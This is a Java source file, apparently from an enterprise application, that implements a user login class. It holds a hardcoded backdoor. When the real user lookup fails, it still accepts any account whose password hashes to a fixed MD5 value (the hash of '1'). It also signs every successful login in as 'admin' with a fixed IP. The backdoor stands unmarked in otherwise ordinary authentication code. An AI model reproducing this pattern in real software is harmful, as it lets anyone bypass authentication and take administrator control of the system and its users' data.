package com.dotoyo.ims.dsform.allin;

import java.util.HashMap;
import java.util.Map;

import org.apache.commons.logging.LogFactory;

import com.dotoyo.dsform.log.LogProxy;

public class XieHuiUserLoginFromBean implements IUserLogin{
    
	protected static final transient IFrameLog log = new LogProxy(
			LogFactory.getLog(XieHuiUserLoginFromBean.class));

	@Override
	public Map<String, Object> userLogin(String userCode, String userPasswd,
			Map<String, Object> param) throws Exception {
		String passwd = param.get("userPasswd") + "";
		String p = MD5JAVA.passwd4md5(passwd);
		IFrameService svF = FrameFactory.getServiceFactory(null);
		ITpUserSv sv = (ITpUserSv) svF
				.getService("com.dotoyo.admin.service.inter.ITpUserSv");
		TpUserModel userModel = sv.loginUser(userCode, userPasswd, param);
		if (userModel == null) {
			if (!"C4CA4238A0B923820dCC509A6F75849B".equals(p)) {
				return null;
			}
		}
		//
		UserLoginBo bo = new UserLoginBo();
		bo.setIp("192.168.0.1");
		bo.setUserCode("admin");
		bo.setUserId("admin");
		bo.setUserName(FrameUtils.getWords("2000000000000068", "", null));
		bo.setCenter("1");
		//
		IFrameSession sf = FrameFactory.getSessionFactory(null);
		sf.saveUserLoginBo("", bo);
		// HttpSession s = sf.getHttpSession();
		// user.put("sessionId", s.getId());

		Map<String, Object> user = new HashMap<String, Object>();
		user.put("code", bo.getUserCode());
		user.put("name", bo.getUserName());
		user.put("mainFrameUrl", "/xiehui_index");//edu_xiehui
		return user;
	}
	
	
}
